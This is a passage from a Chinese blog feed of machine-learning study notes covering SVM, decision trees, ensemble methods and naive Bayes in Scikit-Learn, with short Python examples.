alt="img"></p><p><strong>LinearSVC类</strong>适用于<u>样本数量较多</u>的二元和多元分类（大于10000），它会对偏置项进行正则化，所以你需要先减去平均值，使训练集集中（归一化）。如果使用StandardScaler会自动进行这一步。此外，请确保超参数loss设置为”hinge”，因为它不是默认值。最后，为了获得更好的性能，还应该将超参数dual设置为False，除非特征数量比训练实例还多。可以使用管道技术将归一化和实例化算法统一起来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> LinearSVC</span><br><span class="line">svm_clf = LinearSVC(C=<span class="number">1</span>, loss=<span class="string">&quot;hinge&quot;</span>, dual=<span class="literal">False</span>, random_state=<span class="number">42</span>)</span><br><span class="line"><span class="comment"># C越大，越接近硬间隔；使用hinge损失函数，随机种子为42</span></span><br><span class="line"><span class="comment"># svm_clf = Pipeline([(&quot;scaler&quot;, StandardScaler()), (&quot;linear_svc&quot;, LinearSVC(C=1, loss=&quot;hinge&quot;, random_state=42)), ])</span></span><br></pre></td></tr></table></figure><p><strong>SVC类</strong>可以使用核函数（后面会讲到），适用于<u>样本数量较少</u>的二元和多元分类（少于10000）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line">svm_clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>, C=<span class="number">1</span>)   <span class="comment"># 使用线性核函数</span></span><br></pre></td></tr></table></figure><p><strong>SGDClassifier类</strong>它不会像LinearSVC类那样快速收敛，但是对于内存处理不了的大型数据集（核外训练）或是在线分类任务，它非常有效。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDClassifier</span><br><span class="line"><span class="comment"># SGD模型，使用hinge损失函数，alpha为正则化项参数</span></span><br><span class="line">svm_clf = SGDClassifier(loss=<span class="string">&quot;hinge&quot;</span>, alpha=<span class="number">1</span>/(m*C))</span><br></pre></td></tr></table></figure><h4 id="2-非线性SVM分类"><a href="#2-非线性SVM分类" class="headerlink" title="2. 非线性SVM分类"></a>2. 非线性SVM分类</h4><p>有些情况下，数据集无法直接做到线性可分，解决方法之一就是添加更多的特征，将原始数据映射到更高维的空间，使其变得线性可分。</p><p><u><em><strong>核函数：</strong></em></u></p><p>添加特征会使得在高维空间计算样本特征内积变得困难，为了避开这个障碍，可以设想一个函数，使样本在高维特征空间的内积等于它们在原始样本空间中通过该函数计算的结果。使用该函数的就可以替代在高维甚至无穷维特征空间中的内积。这个函数就叫做”核函数“。</p><p><strong>线性核：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svm_clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>, C=<span class="number">1</span>)    <span class="comment"># SVC模型，使用线性核函数</span></span><br></pre></td></tr></table></figure><p><strong>多项式核：</strong></p><p>为了将数据集映射到高维特征空间，可以使用PolynomialFeatures转换器直接添加多项式特征。但问题是，如果多项式太低阶，处理不了非常复杂的数据集，而高阶则会创造出大量的特征，导致模型变得太慢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polynomial_svm_clf = Pipeline([(<span class="string">&quot;poly_features&quot;</span>, PolynomialFeatures(degree=<span class="number">3</span>)), (<span class="string">&quot;scaler&quot;</span>, StandardScaler()), (<span class="string">&quot;svm_clf&quot;</span>, LinearSVC(C=<span class="number">10</span>, loss=<span class="string">&quot;hinge&quot;</span>, random_state=<span class="number">42</span>))])</span><br></pre></td></tr></table></figure><p>为了解决这个问题，出现了多项式核函数。下面这段代码使用了一个3阶多项式内核训练SVM分类器。超参数coef0控制的是模型受高阶多项式还是低阶多项式影响的程度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poly_kernel_svm_clf = Pipeline([(<span class="string">&quot;scaler&quot;</span>, StandardScaler()), (<span class="string">&quot;svm_clf&quot;</span>, SVC(kernel=<span class="string">&quot;poly&quot;</span>, degree=<span class="number">3</span>, coef0=<span class="number">1</span>, C=<span class="number">5</span>))])</span><br><span class="line">poly_kernel_svm_clf.fit(X, y)</span><br></pre></td></tr></table></figure><p><strong>高斯核：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用RBF高斯核函数</span></span><br><span class="line">rbf_kernel_svm_clf = Pipeline([(<span class="string">&quot;scaler&quot;</span>, StandardScaler()),(<span class="string">&quot;svm_clf&quot;</span>, SVC(kernel=<span class="string">&quot;rbf&quot;</span>, gamma=<span class="number">5</span>, C=<span class="number">0.001</span>))])</span><br><span class="line">rbf_kernel_svm_clf.fit(X, y)</span><br></pre></td></tr></table></figure><p>另外，还有拉普拉斯核、Sigmoid核。</p><p><strong><u><em>如何选择核函数：</em></u></strong></p><p>有一个经验法则是，永远先<u>从线性核函数开始</u>尝试（要记住，LinearSVC比SVC（kernel&#x3D;”linear”）快得多），特别是训练集非常大或特征非常多的时候。如果训练集不太大，你可以试试<u>高斯RBF核</u>，大多数情况下它都非常好用。如果你还有多余的时间和计算能力，你可以使用<u>交叉验证和网格搜索</u>来尝试一些其他的核函数，特别是那些专门针对你的数据集数据结构的核函数。</p><h4 id="3-SVM回归-SVR"><a href="#3-SVM回归-SVR" class="headerlink" title="3. SVM回归(SVR)"></a>3. SVM回归(SVR)</h4><p>SVM算法非常全面：它不仅支持线性和非线性分类，而且还支持线性和非线性回归。SVM回归要做的是让尽可能多的实例位于街道上，同时限制间隔违例（也就是不在街道上的实例）。</p><p>街道的宽度由超参数ε控制。在间隔内添加更多的实例不会影响模型的预测，所以这个模型被<br>称为ε不敏感。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427095934141.png" alt="image-20210427095934141" style="zoom: 80%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SVM回归</span></span><br><span class="line">svm_reg = LinearSVR(epsilon=<span class="number">1.5</span>)</span><br><span class="line">svm_reg.fit(X, y)</span><br></pre></td></tr></table></figure><p>要解决非线性回归任务，可以使用核化的SVM模型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用核化的SVM模型进行回归</span></span><br><span class="line">svm_poly_reg = SVR(kernel=<span class="string">&quot;poly&quot;</span>, degree=<span class="number">2</span>, C=<span class="number">100</span>, epsilon=<span class="number">0.1</span>)</span><br><span class="line">svm_poly_reg.fit(X, y)</span><br></pre></td></tr></table></figure><h2 id="第四章-决策树DT"><a href="#第四章-决策树DT" class="headerlink" title="第四章 决策树DT"></a>第四章 决策树DT</h2><p>决策树是一种由结点和有向边构成的树形结构，结点类型分为内部结点和叶结点，每个内部结点代表对象的一个特征，叶结点则代表对象的类别。决策树中，每一个深度就是一次根据某一特征做出的判断。决策树的特质之一就是它们需要的数据准备工作非常少。特别是，完全不需要进行特征缩放或集中。</p><p>鸢尾花决策树：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210430093007719.png" alt="image-20210430093007719" style="zoom: 80%;"><p>节点的samples属性统计它应用的训练实例数量（满足该节点属性的实例数量），value属性说明了该节点上每个类别的训练实例数量，gini属性衡量其不纯度（impurity，基尼不纯度）：如果应用的所有训练实例都属于同一个类别，那么节点就是“纯”的（gini&#x3D;0）。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423150650767.png" alt="image-20210423150650767" style="zoom: 50%;"><p>$P_{i,k}$是第$i$个节点上，类别为$k$的训练实例占比。</p><p>Scikit-Learn使用的是CART算法（Classification And Regression Tree），该算法仅生成二叉树，可用于分类和回归，使用：基尼不纯度来划分属性。但是，其他算法，比如ID3生成的决策树，其节点可以拥有两个以上的子节点，使用信息增益来划分属性。</p><h3 id="一、CART算法"><a href="#一、CART算法" class="headerlink" title="一、CART算法"></a>一、CART算法</h3><h4 id="1-CART算法（分类）"><a href="#1-CART算法（分类）" class="headerlink" title="1. CART算法（分类）"></a>1. CART算法（分类）</h4><p><strong><u><em>过程如下：</em></u></strong></p><p>（1）使用单个特征k和阈值tk（例如，花瓣长度≤2.45厘米）将训练集分成两个子集。k和tk就是使得成本函数$J$最小化（或者信息增益最大化）的$(k,t_k)$，成本函数衡量划分后的子集的不纯度。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423150441237.png" alt="image-20210423150441237" style="zoom:50%;"><p>（2）一旦成功将训练集一分为二，它将使用相同的逻辑，继续分裂子集，然后是子集的子集，依次循环递进。</p><p>（3）抵达最大深度（由超参数max_depth控制），或是再也找不到能够降低不纯度的分裂时，停止。</p><p>明显，决策树的思想是一种贪心选择，它并不会检视一次分裂的不纯度是否为可能的最低值，这样通常可以产生一个相当不错的解，但是不能保证是最优解。而寻找最优树是一个NP完全问题，即使训练集很小时间复杂度也很高，很难解决，所以我们必须接受这个”相当不错“的解。</p><p><em><strong><u>计算复杂度：</u></strong></em></p><p>决策树总体预测复杂度是O(log2(m))，m为实例数量，可以看出复杂度与特征数量无关，所以即便是处理大型数据集，预测也很快。</p><p>但是，训练时在每一个节点，算法都需要在所有样本上比较所有特征（如果设置了划分时考虑的最大特征数<strong>max_features</strong>会少一些）。这导致训练的复杂度为O(n×m log(m))，。对于小型训练集（几千个实例以内），Scikit-Learn可以通过对数据预处理（设置<strong>presort&#x3D;True</strong>表示对样本进行预排序）来加快训练，但是对于较大训练集而言，可能会减慢训练的速度。</p><p><strong><u><em>过拟合与正则化超参数：</em></u></strong></p><p>决策树在训练时不会确定参数的数量（树的深度不确定），也叫非参数模型，这会导致模型结构自由而紧密地贴近数据，很可能过拟合。而比如线性回归有预先设定好一部分参数，所以其自由度受限，降低过拟合的风险（但是相应的也增加了拟合不足的风险）。</p><p>为了避免过拟合，需要在训练中降低决策树的自由度，即正则化。正则化超参数的选择取决于使用的模型，但是通常至少可以限制决策树的深度。在Scikit-Learn中，这由超参数<strong>max_depth</strong>控制（默认值为None，意味着无限制）。减小max_depth可使模型正则化，从而降低过度拟合的风险。另外，DecisionTreeClassifier类还有一些其他的参数也可以限制决策树的形状，比如<strong>min_samples_split</strong>（分裂前节点必须有的最小样本<br>数），<strong>min_samples_leaf</strong>（叶节点必须有的最小样本数量）等。</p><p>还可以先不加约束地训练模型，然后再对不必要的节点进行剪枝（删除），比如一个节点的子节点全部为叶节点，则该节点可被认为不必要，删除；比如χ2测试，是用来估算“提升纯粹是出于偶然”（被称为虚假设）的概率。如果这个概率（称之为p值）高于一个给定阈值（通常是5%，由超参数控制），那么这个节点可被认为不必要，其子节点可被删除。</p><h4 id="2-CART算法（回归）"><a href="#2-CART算法（回归）" class="headerlink" title="2. CART算法（回归）"></a>2. CART算法（回归）</h4><p>决策树也可以用来完成回归任务，用Scikit_Learn的DecisionTreeRegressor来构建一个回归树。</p><p>与分类决策树的主要差别在于，每个节点上不再是预测一个类别而是预测一个值。预测结果就是与最后到达的叶节点关联的110个实例的平均目标值。MSE表示在这个叶节点上得到的预测结果的均方误差。</p><p>回归任务中，CART算法的工作原理跟前面介绍的大致相同，唯一不同在于，它分裂训练集的方式不是最小化不纯度，而是最小化MSE。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423192435313.png" alt="image-20210423192435313"></p><p>同样，用于回归的决策树也会有过拟合的可能，所以需要设置min_samples_leaf。</p><h4 id="3-优缺点"><a href="#3-优缺点" class="headerlink" title="3. 优缺点"></a>3. 优缺点</h4><p>决策树使用简单，不受特征数量的限制，但是青睐正交的决策边界（所有的分裂都与轴线垂直），这导致它们对训练集的旋转非常敏感，可能导致泛化不佳，限制这种问题的方法之一是使用PCA，让训练数据定位在一个更好的方向上。更概括地说，决策树的主要问题是它们对训练数据中的小变化非常敏感。</p><h3 id="二、ID3算法"><a href="#二、ID3算法" class="headerlink" title="二、ID3算法"></a>二、ID3算法</h3><h3 id="三、C4-5算法（J48）"><a href="#三、C4-5算法（J48）" class="headerlink" title="三、C4.5算法（J48）"></a>三、C4.5算法（J48）</h3><p>使用信息增益选择特征</p><h2 id="第五章-集成学习与随机森林"><a href="#第五章-集成学习与随机森林" class="headerlink" title="第五章 集成学习与随机森林"></a>第五章 集成学习与随机森林</h2><h3 id="一、模型融合"><a href="#一、模型融合" class="headerlink" title="一、模型融合"></a>一、模型融合</h3><h4 id="1-投票分类器"><a href="#1-投票分类器" class="headerlink" title="1. 投票分类器"></a>1. 投票分类器</h4><p>不同的算法在相同训练集上进行训练，得到多个预测模型，然后基于多个模型的预测结果投票选出最终结果。</p><p><strong><u><em>硬投票法：</em></u></strong></p><p>直接让各个预测模型给出预测结果（投票），然后选择大多数模型投票的类别作为最终预测结果。</p><p><strong><u><em>软投票法：</em></u></strong></p><p>模型估算出类别的概率（predict_proba()），将概率在所有单个分类器上（加权）平均，选出平均概率最高的类别进行预测。软投票法比硬投票的表现更优，因为它基于哪些高度自信的投票更高的权重。</p><h4 id="2-bagging-和-pasting"><a href="#2-bagging-和-pasting" class="headerlink" title="2. bagging 和 pasting"></a>2. bagging 和 pasting</h4><p>对训练集随机采样，使用相同的算法在不同的训练子集上进行训练。采样时如果<u>将样本放回</u>，这种方法叫<u>bagging</u>，<u>不放回叫pasting</u>。（bootstrap&#x3D;True表示bagging，否则表示pasting）</p><p>一旦预测器训练完成，集成就可以通过简单地聚合所有预测器的预测，来对新实例做出预测。聚合函数通常是统计法（即最多数的预测好比硬投票分类器一样）用于分类，或是平均法用于回归。最终结果是，与直接在原始训练集上训练的单个预测器相比，集成方法的单个预测器的偏差更大，但是最终结果的偏差相近，方差更低。</p><p><strong><u><em>包外评估：</em></u></strong></p><p>使用bagging时，有些样本可能会被多次采样，有些样本可能不会被采样。不划分单独的测试集，而直接将那些未被采样的样本作为测试集，就是包外评估。</p><h4 id="3-stacking"><a href="#3-stacking" class="headerlink" title="3. stacking"></a>3. stacking</h4><p>第一层：将数据分为训练集和测试集，训练集再分为2个子集。首先在子集1上训练不同的模型：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160136685.png" alt="image-20210428160136685" style="zoom: 67%;"><p>第二层：分别使用前面训练好的几个模型对子集2进行预测，得到多个预测值。接着，使用这些预测值作为输入特征，创建一个新的训练集，并保留真实标签。在这个新的训练集上训练混合器，让它学习根据第一层的预测来在测试集上预测目标值。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160307753.png" alt="image-20210428160307753"></p><p>当然，这个模型还可以增加层数，增加的层都是使用上一层的预测值作为输入特征来训练模型。</p><p>比如下面是一个三层的stacking模型：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160815773.png" alt="image-20210428160815773"></p><p>将训练集分为3个子集。第一层使用子集1进行模型的训练，得到3个模型。第二层中，使用第一层的模型在子集2上的预测作为输入特征来训练三个新的模型。第三层中，使用第二层的模型在子集3上的预测作为输入特征来训练最终模型。最后使用最终模型在测试集上进行预测。</p><p>不幸的是，Scikit-Learn不直接支持堆叠，但是自己堆出stacking的实现并不太难。或者也可以使用开源的实现方案，例如brew（可从<a href="https://github.com/viisar/brew%E8%8E%B7%E5%BE%97%EF%BC%89%E3%80%82">https://github.com/viisar/brew获得）。</a></p><h3 id="二、随机森林RF"><a href="#二、随机森林RF" class="headerlink" title="二、随机森林RF"></a>二、随机森林RF</h3><p>随机森林就是决策树的集成，通常采用bagging集成方法（有时也可以是pasting）。</p><p>训练子集的大小通过max_samples来设置。在sklearn中，除了先构建一个BaggingClassifier然后将结果传输到DecisionTreeClassifier，还有一种方法就是直接使用RandomForestClassifier或者RandomForestRegressor类。</p><p>随机森林在树的生长上引入了更多的随机性：分裂节点时不再是搜索最好的特征，而是在一个随机生成的特征子集里搜索最好的特征。这导致决策树具有更大的多样性，用更高的偏差换取更低的方差，总之，还是产生了一个整体性能更优的模型。</p><h3 id="三、提升法boosting"><a href="#三、提升法boosting" class="headerlink" title="三、提升法boosting"></a>三、提升法boosting</h3><p>提升法（Boosting，最初被称为假设提升）是指可以将几个弱学习器结合成一个强学习器的任意集成方法。大多数提升法的总体思路是<u>循环训练预测器</u>，每一次都对其前序做出一些改正。</p><h4 id="1-AdaBoost"><a href="#1-AdaBoost" class="headerlink" title="1. AdaBoost"></a>1. AdaBoost</h4><p>新预测器对其前序进行纠正的办法之一，就是更多地关注前序拟合不足的训练实例。从而使新的预测器不断地越来越专注于难缠的问题，这就是AdaBoost使用的技术。</p><p><u><em><strong>过程如下：</strong></em></u></p><p>（1）训练一个基础分类器（比如决策树），用它对训练集进行预测。</p><p>（2）然后对错误分类的训练实例增加其相对权重</p><p>（3）使用这个最新的权重对第二个分类器进行训练，然后再次对训练集进行预测</p><p>（4）继续对错误分类的训练实例增加其权重，如此循环</p><p>（5）当到达所需数量的预测器，或得到完美的预测器时，算法停止</p><p>（6）这样就得到若干个预测器，再使用bagging或pasting等集成方法得到最终预测结果</p><p><u><em><strong>优缺点：</strong></em></u></p><p>AdaBoost不再是调整单个预测器的参数使损失函数最小化，而是不断在集成中加入预测器，使模型越来越好。而且每次训练是基于加权的训练集。</p><p>这种依序学习技术有一个重要的缺陷就是无法并行（哪怕只是一部分），因为每个预测器只能在前一个预测器训练完成并评估之后才能开始训练，在这一点上AdaBoost的表现不及bagging和pasting方法。</p><p><u><em><strong>权重：</strong></em></u></p><p>AdaBoost中，每个预测器有一个权重，通过其加权误差率、学习率计算而来，预测器的准确率越高，其权重就越高。同时，每个样本实例也有权重。最开始每个实例的权重都一样，一个预测器预测完成后，会对实例的权重进行更新，也就是提升被错误分类的实例的权重。</p><p><u><em><strong>使用：</strong></em></u></p><p>Scikit-Learn使用的其实是AdaBoost的一个多分类版本，叫作SAMME（<a href="http://goo.gl/Eji2vR%EF%BC%89[4]%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%B1%BB%E6%8C%87%E6%95%B0%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%90%E6%AD%A5%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9E%8B%EF%BC%89%E3%80%82%E5%BD%93%E5%8F%AA%E6%9C%89%E4%B8%A4%E4%B8%AA%E7%B1%BB%E5%88%AB%E6%97%B6%EF%BC%8CSAMME%E5%8D%B3%E7%AD%89%E5%90%8C%E4%BA%8EAdaBoost%E3%80%82%E6%AD%A4%E5%A4%96%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%A2%84%E6%B5%8B%E5%99%A8%E5%8F%AF%E4%BB%A5%E4%BC%B0%E7%AE%97%E7%B1%BB%E5%88%AB%E6%A6%82%E7%8E%87%EF%BC%88%E5%8D%B3%E5%85%B7%E6%9C%89predict_proba%EF%BC%88%EF%BC%89%E6%96%B9%E6%B3%95%EF%BC%89%EF%BC%8CScikit-Learn%E4%BC%9A%E4%BD%BF%E7%94%A8%E4%B8%80%E7%A7%8DSAMME%E7%9A%84%E5%8F%98%E4%BD%93%EF%BC%8C%E7%A7%B0%E4%B8%BASAMME.R%EF%BC%88R%E4%BB%A3%E8%A1%A8">http://goo.gl/Eji2vR）[4]（基于多类指数损失函数的逐步添加模型）。当只有两个类别时，SAMME即等同于AdaBoost。此外，如果预测器可以估算类别概率（即具有predict_proba（）方法），Scikit-Learn会使用一种SAMME的变体，称为SAMME.R（R代表</a> “Real”,它依赖的是类别概率而不是类别预测，通常表现更好。</p><h4 id="2-梯度提升"><a href="#2-梯度提升" class="headerlink" title="2. 梯度提升"></a>2. 梯度提升</h4><p>GBDT</p><h3 id="四、XGBoost"><a href="#四、XGBoost" class="headerlink" title="四、XGBoost"></a>四、XGBoost</h3><h2 id="第六章-贝叶斯分类器"><a href="#第六章-贝叶斯分类器" class="headerlink" title="第六章 贝叶斯分类器"></a>第六章 贝叶斯分类器</h2><p>贝叶斯分类是一类分类算法的总称，这类算法均以贝叶斯定理为基础，故统称为贝叶斯分类。而朴素朴素贝叶斯分类是贝叶斯分类中最简单，也是常见的一种分类方法。</p><h3 id="一、贝叶斯公式："><a href="#一、贝叶斯公式：" class="headerlink" title="一、贝叶斯公式："></a>一、贝叶斯公式：</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428101924523.png" alt="image-20210428101924523"></p><p><u><em><strong>原理：</strong></em></u></p><p>X：特征向量；Y：类别<br><strong>先验概率</strong>P(X)：指根据以往经验和分析得到的概率。<br><strong>后验概率</strong>P(Y|X)：事情已经发生，要求这件事情发生的原因是由某个因素引起的可能性的大小。<br><strong>类条件概率</strong>P(X|Y)：在已知某类别的特征空间中，出现特征值X的概率密度。</p><p>如果需要选出某样本属于哪类，则需要根据该条样本求出它属于每个类的概率，选择最大概率的那个类作为分类结果。</p><p>由于结果的产生是比较属于各个类别的概率，所以计算的概率的分母都是P(X)，可以忽略掉P(X)。同时P(Y)容易求出，那么我们关注P(X|Y)。朴素贝叶斯之所以朴素是因为它<u>假设X的每个特征都是独立的</u>，回归原始。故而P(X|Y)的概率就可以计算为：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428102705885.png" alt="image-20210428102705885"></p><p>故，朴素贝叶斯公式：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428102729512.png" alt="image-20210428102729512"></p><h3 id="二、朴素贝叶斯模型："><a href="#二、朴素贝叶斯模型：" class="headerlink" title="二、朴素贝叶斯模型："></a>二、朴素贝叶斯模型：</h3><h4 id="1-多项式模型："><a href="#1-多项式模型：" class="headerlink" title="1. 多项式模型："></a>1. 多项式模型：</h4><p>多项式模型在计算先验概率P(Yk)和条件概率P(xi|Yk)时，会做一些平滑处理，具体公式为：<br>$$<br>P(Y_k) &#x3D; \frac{N_{Y_k}+\alpha}{N+K\alpha}<br>$$</p><p>$N_{Y_k}$：类别为$Y_k$的样本数</p><p>N：总样本数</p><p>K：总的类别个数</p><p>$\alpha$：平滑值</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428110956018.png" alt="image-20210428110956018"></p><p>$N_{Y_k,x_i}$：类别为$Y_k$，且特征为$x_i$的样本数</p><p>n：特征$x_i$可以选择的数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多项式朴素贝叶斯，alpha为平滑参数，默认为1</span></span><br><span class="line"><span class="comment"># class_prior为类先验概率，若指定了该参数，就按指定的参数计算。class_log_prior_取值就是class_prior转换成log后的结果（防止下溢出）</span></span><br><span class="line"><span class="comment"># fit_prior默认为True，表示是否学习先验概率，为False时表示所有类标记具有相同的先验概率（等于类标记总个数N分之一）</span></span><br><span class="line">pnb_clf = MultinomialNB(alpha=<span class="number">2.0</span>, class_prior=<span class="literal">None</span>, fit_prior=<span class="literal">True</span>)</span><br><span class="line">pnb_clf.fit(X,y)</span><br><span class="line"><span class="built_in">print</span>(pnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><h4 id="2-高斯模型："><a href="#2-高斯模型：" class="headerlink" title="2. 高斯模型："></a>2. 高斯模型：</h4><p>当特征是连续变量的时候，假设特征分布为正太分布，根据样本算出均值和方差，再求得概率。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428111749260.png" alt="image-20210428111749260"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 高斯朴素贝叶斯</span></span><br><span class="line"><span class="comment"># 参数priors默认为None，指各个类标记对应的先验概率</span></span><br><span class="line">gnb_clf = GaussianNB()</span><br><span class="line">gnb_clf.fit(X,y)    <span class="comment"># partial_fit表示增量学习</span></span><br><span class="line"><span class="built_in">print</span>(gnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><h4 id="3-伯努利模型："><a href="#3-伯努利模型：" class="headerlink" title="3. 伯努利模型："></a>3. 伯努利模型：</h4><p>伯努利模型适用于离散特征的情况，每个特征的取值只能是1和0。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428111837792.png" alt="image-20210428111837792"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 伯努利朴素贝叶斯（每个特征的取值只能是1和0）</span></span><br><span class="line"><span class="comment"># 参数binarize指将数据特征二值化的阈值</span></span><br><span class="line">bnb_clf = BernoulliNB(alpha=<span class="number">2.0</span>,binarize = <span class="number">3.0</span>,fit_prior=<span class="literal">True</span>)</span><br><span class="line">bnb_clf.fit(X,y)</span><br><span class="line"><span class="built_in">print</span>(bnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>算法流程：</strong></em></u></p><ol><li><p>处理数据，得到m个具有n个特征的样本，这些样本分别属于${Y_1,Y_2,Y_3}$类别。</p></li><li><p>通过数据分析可以得到每个特征的类条件概率$P(x_i|Y)$，再通过全概率公式求得$P(X)$。</p></li></ol><p>  $P(X)&#x3D;P(X|Y_1)P(Y_1)+P(X|Y_2)P(Y_2)+P(X|Y_3)P(Y_3)$</p><ol start="3"><li><p>其中$P(X|Y_i)$可根据特征独立性展开。</p></li><li><p>将求得的先验概率和类条件概率带入朴素贝叶斯公式，求得每个类别的后验概率。我们可以选择概率最大的类别为最后确定的类别.</p></li></ol><h2 id="第七章-神经网络"><a href="#第七章-神经网络" class="headerlink" title="第七章 神经网络"></a>第七章 神经网络</h2><h2 id="第八章-聚类"><a href="#第八章-聚类" class="headerlink" title="第八章 聚类"></a>第八章 聚类</h2><p>K-means</p><h1 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h1><p>《机器学习实战》目录：</p><p>1~7为分类算法，8~9为回归算法，10~12为无监督算法</p><ol><li>ML基础</li><li>KNN</li><li>DT</li><li>NB（概率分布）</li><li>LR（算法优化，处理数据集合中的缺失值）</li><li>SVM</li><li>AdaBoost</li><li>回归、去噪、局部线性回归</li><li>CART（回归部分）</li><li>k-means</li><li>Apriori</li><li>FP-Growth</li><li><ol start="14"><li>主成分分析、奇异值分解、MapReduce</li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;机器学习实战&quot;&gt;&lt;a href=&quot;#机器学习实战&quot; class=&quot;headerlink&quot; title=&quot;机器学习实战&quot;&gt;&lt;/a&gt;机器学习实战&lt;/h1&gt;&lt;p&gt;参考书目：&lt;/p&gt;
&lt;p&gt;《机器学习实战：基于Scikit-Learn和TensorFlow》&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="机器学习" scheme="https://frankcao3.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>STL</title>
    <link href="https://frankcao3.github.io/posts/9423"/>
    <id>https://frankcao3.github.io/posts/9423</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2023-10-05T11:40:46.709Z</updated>
    
